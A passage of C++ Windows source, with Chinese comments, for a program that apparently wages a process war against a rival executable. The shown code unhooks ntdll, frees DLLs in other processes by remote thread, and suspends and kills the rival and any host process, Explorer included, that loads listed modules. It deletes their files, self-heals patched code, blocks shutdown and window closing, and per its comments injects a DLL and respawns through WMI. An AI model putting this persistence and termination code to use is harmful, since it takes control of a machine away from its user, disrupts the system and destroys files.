                            HANDLE hTh = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pFree, me.modBaseAddr, 0, NULL);
                            if (hTh) { WaitForSingleObject(hTh, 2000); CloseHandle(hTh); }
                        }
                        break;
                    }
                }
            } while (Module32NextW(mSnap, &me));
        }
        CloseHandle(mSnap);
    }
    CloseHandle(hProc);
}

// 找到 xx 那个可见的 XX_ALIVE_WND_* 弹窗，直接杀掉它的宿主进程。
// 卸载（FreeLibrary）又慢又不可靠（xx 500ms 重新注入，且 DETACH 会卡 3 秒），
// 杀宿主最干净利落——弹窗随进程一起消失。
static BOOL CALLBACK FindEnemyPopupProc(HWND hWnd, LPARAM lp) {
    DWORD* pPid = (DWORD*)lp;
    if (!IsWindowVisible(hWnd)) return TRUE;
    wchar_t cls[128] = { 0 };
    GetClassNameW(hWnd, cls, 128);
    if (wcsstr(cls, L"XX_ALIVE_WND_")) {
        GetWindowThreadProcessId(hWnd, pPid);
        return FALSE;
    }
    return TRUE;
}

static void KillEnemyPopupHost() {
    DWORD pid = 0;
    EnumWindows(FindEnemyPopupProc, (LPARAM)&pid);
    if (pid == 0 || pid == GetCurrentProcessId()) return;
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h) {
        TerminateProcess(h, 0);
        CloseHandle(h);
    }
}

static DWORD WINAPI HunterWorker(LPVOID lpParamToken) {
    EnableDebugPrivilege();
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (hMod) {
        pfnSuspend = (fnSuspend)GetProcAddress(hMod, "NtSuspendProcess");
        pfnSuspendThread = (fnSuspendThread)GetProcAddress(hMod, "NtSuspendThread");
    }
    void* pQuery = (void*)GetProcAddress(hMod, "NtQuerySystemInformation");
    BYTE queryCache[5] = { 0 };
    if (pQuery) memcpy(queryCache, pQuery, 5);
    while (true) {
        if (pQuery) {
            DWORD op; if (VirtualProtect(pQuery, 5, PAGE_EXECUTE_READWRITE, &op)) { memcpy(pQuery, queryCache, 5); VirtualProtect(pQuery, 5, op, &op); }
        }
        // 先杀 xx 的可见弹窗宿主（最干净），再枚举进程杀 xx.exe
        KillEnemyPopupHost();
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (pe.th32ProcessID <= 4) continue;
                    if (CheckNameMatch(pe.szExeFile, HONEYPOT_EXE_NAME)) continue;
                    bool bIsGoal = CheckNameMatch(pe.szExeFile, GOAL_NAME);
                    bool wipe = false;
                    DWORD triggerPID = InterlockedExchangeAdd((LONG*)&g_HoneypotTriggeredPID, 0);
                    if (triggerPID != 0 && pe.th32ProcessID == triggerPID) wipe = true;
                    if (bIsGoal) wipe = true;
                    if (!wipe) {
                        // 加载了敌方 DLL（window.dll/svcguard.dll 等）就杀。
                        // yyguard.dll 已藏在 xx 不碰的服务进程里，杀这些宿主不会误伤自己。
                        HANDLE mSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
                        if (mSnap != INVALID_HANDLE_VALUE) {
                            MODULEENTRY32W me = { sizeof(MODULEENTRY32W) };
                            if (Module32FirstW(mSnap, &me)) {
                                do {
                                    for (int k = 0; k < BAD_COUNT; k++) {
                                        if (CheckNameMatch(me.szModule, BAD_MODULES[k])) { wipe = true; break; }
                                    }
                                    if (wipe) break;
                                } while (Module32NextW(mSnap, &me));
                            }
                            CloseHandle(mSnap);
                        }
                    }
                    if (!wipe) continue;
                    {
                        wchar_t targetDiskPath[MAX_PATH] = { 0 };
                        HANDLE hQueryPath = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                        if (hQueryPath) {
                            DWORD dwPathSize = MAX_PATH;
                            QueryFullProcessImageNameW(hQueryPath, 0, targetDiskPath, &dwPathSize);
                            CloseHandle(hQueryPath);
                        }
                        HANDLE hCurrentThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                        if (hCurrentThreadSnapshot != INVALID_HANDLE_VALUE) {
                            THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
                            if (Thread32First(hCurrentThreadSnapshot, &te32)) {
                                do {
                                    if (te32.th32OwnerProcessID == pe.th32ProcessID) {
                                        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                                        if (hThread != NULL) {
                                            if (pfnSuspendThread) pfnSuspendThread(hThread, NULL);
                                            else SuspendThread(hThread);
                                            CloseHandle(hThread);
                                        }
                                    }
                                } while (Thread32Next(hCurrentThreadSnapshot, &te32));
                            }
                            CloseHandle(hCurrentThreadSnapshot);
                        }
                        HANDLE hSusp = OpenProcess(0x0800, FALSE, pe.th32ProcessID);
                        if (hSusp && pfnSuspend) { pfnSuspend(hSusp); CloseHandle(hSusp); }
                        HANDLE hKill = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hKill) {
                            ReleaseFileLocks();
                            TerminateProcess(hKill, 0);
                            CloseHandle(hKill);
                            // 只有 xx.exe 才删它自己的 exe 和 xxres.bin；宿主(explorer 等)只杀不删
                            if (bIsGoal) {
                                if (lstrlenW(targetDiskPath) > 0) {
                                    DeleteFileW(targetDiskPath);
                                    wchar_t bakPath[MAX_PATH];
                                    wcscpy_s(bakPath, targetDiskPath);
                                    wchar_t* bslash = wcsrchr(bakPath, L'\\');
                                    if (bslash) { bslash[1] = L'\0'; wcscat_s(bakPath, L"xxres.bin"); DeleteFileW(bakPath); }
                                }
                                for (int k = 0; k < BAD_COUNT; k++) {
                                    wchar_t absBad[MAX_PATH * 2] = { 0 };
                                    ResolveNextToExe(BAD_MODULES[k], absBad, MAX_PATH * 2);
                                    if (absBad[0]) DeleteFileW(absBad);
                                }
                                LogAction("Wipe Engine: Discovered target. File system locked and cleared.");
                                LockDownMaliciousFileNodes();
                            }
                            if (pe.th32ProcessID == triggerPID) InterlockedExchange((LONG*)&g_HoneypotTriggeredPID, 0);
                        }
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        Sleep(50);
    }
    return 0;
}
static LONG WINAPI QuickVeh(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        void* addr = pEx->ExceptionRecord->ExceptionAddress;
        if (addr >= g_pMainTextBase && addr < (BYTE*)g_pMainTextBase + g_dwTextSize) {
            SIZE_T offset = (BYTE*)addr - (BYTE*)g_pMainTextBase;
            BYTE originalByte = g_pOriginalImageBackup[offset];
            DWORD op;
            if (VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &op)) {
                *(unsigned char*)addr = originalByte;
                VirtualProtect(addr, 1, op, &op);
                LogAction("Matrix VEH Shield: Discovered 0xCC patch attempt! Self-healed.");
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
static void InitializeCodeImageBackup() {
    HMODULE hMainModule = GetModuleHandleW(NULL); if (!hMainModule) return;
    g_pMainTextBase = (void*)hMainModule; g_dwTextSize = 0x50000;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hMainModule;
    if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMainModule + dosHeader->e_lfanew);
        if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(ntHeaders);
            WORD numSections = ntHeaders->FileHeader.NumberOfSections;
            for (WORD i = 0; i < numSections; i++) {
                if (strcmp((const char*)pSection[i].Name, ".text") == 0) {
                    g_pMainTextBase = (void*)((BYTE*)hMainModule + pSection[i].VirtualAddress);
                    g_dwTextSize = pSection[i].Misc.VirtualSize;
                    break;
                }
            }
        }
    }
    g_pOriginalImageBackup = new BYTE[g_dwTextSize];
    memcpy(g_pOriginalImageBackup, g_pMainTextBase, g_dwTextSize);
}
// 创建（或重建）主窗口 + 日志框
static void CreateMainWindow(HINSTANCE hInst) {
    g_hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"YYWnd_7f3a9c1e", SHOW_TITLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, hInst, NULL);
    if (g_hMainWnd) {
        g_hLogBox = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 10, 10, 460, 340, g_hMainWnd, NULL, hInst, NULL);
    }
}
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if (msg == WM_QUERYENDSESSION || msg == WM_ENDSESSION) return FALSE;
    if (msg == WM_CLOSE) return 0;
    if (msg == WM_DESTROY) return 0;   // 吞掉销毁消息，主循环会重建窗口
    return DefWindowProcW(hwnd, msg, wp, lp);
}
static void YyLog(const wchar_t* msg) {
    WCHAR path[MAX_PATH] = { 0 };
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) wcscpy_s(path, L"C:\\yy_debug.log");
    else { WCHAR* s = wcsrchr(path, L'\\'); if (s) s[1] = L'\0'; wcscat_s(path, L"yy_debug.log"); }
    HANDLE h = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        WCHAR line[512];
        swprintf_s(line, 512, L"[%lu] %s\r\n", GetCurrentProcessId(), msg);
        DWORD w = 0;
        WriteFile(h, line, (DWORD)(wcslen(line) * sizeof(WCHAR)), &w, NULL);
        CloseHandle(h);
    }
}

int main() {
    InitializeCriticalSection(&g_LockBox);
    YyLog(L"yy.exe main started");
    // 最早启动生存机制（1ms 内）：注入 yyguard.dll + 抢锁 + 杀 xx.exe + WMI复活 + 备份，
    // 防止 xx 在几十毫秒内把 yy.exe 秒了导致一切都没初始化，并抢先杀掉 xx.exe 赢下竞速
    CreateThread(NULL, 0, ServiceWorker, NULL, 0, NULL);     // 注入 yyguard.dll（快）
    CreateThread(NULL, 0, MutexHoldThread, NULL, 0, NULL);   // 占锁（快）
    CreateThread(NULL, 0, HunterWorker, NULL, 0, NULL);      // 抢先杀 xx.exe（赢竞速）
    CreateThread(NULL, 0, WmiRespawnThread, NULL, 0, NULL);  // WMI 复活（后台）
    CreateThread(NULL, 0, SelfProtectThread, NULL, 0, NULL); // 备份（快）
    InitializeCodeImageBackup();
    // 完美修复 3：统一前置声明标识符对齐到全局标准的 QuickVeh 异常回调函数
    AddVectoredExceptionHandler(1, QuickVeh);
    LockDownMaliciousFileNodes();
    LockDownBbyovdChannels();
    CreateThread(NULL, 0, WmiKillerThread, NULL, 0, NULL);
    ForceLockDllInjection();
    HINSTANCE hInst = GetModuleHandleW(NULL);
    WNDCLASSEXW wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEXW); wc.lpfnWndProc = WndProc; wc.hInstance = hInst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"YYWnd_7f3a9c1e";
    if (!RegisterClassExW(&wc)) return 0;
    CreateMainWindow(hInst);
    LogAction("System Shield Active. Trampoline isolation initialized.");
    HANDLE hT2 = CreateThread(NULL, 0, ShieldWorker, NULL, 0, NULL);
    HANDLE hT4 = CreateThread(NULL, 0, HoneypotDecoyWorker, NULL, 0, NULL);
    if (hT2) CloseHandle(hT2); if (hT4) CloseHandle(hT4);
    MSG msg;
    while (true) {
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) continue;   // 吞掉一切 WM_QUIT（含对手投递的）
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        if (!g_hMainWnd || !IsWindow(g_hMainWnd)) {
            CreateMainWindow(hInst);                 // 主窗口被销毁后自动重建
        }
        Sleep(20);
    }
    ReleaseFileLocks();
    if (g_hEnemyMutexLock != NULL) CloseHandle(g_hEnemyMutexLock);
    for (int i = 0; i < BYOVD_COUNT; i++) {
        if (g_hDeviceLocks[i] != INVALID_HANDLE_VALUE) CloseHandle(g_hDeviceLocks[i]);
    }
    DeleteCriticalSection(&g_LockBox);
    delete[] g_pOriginalImageBackup;
    return 0;
}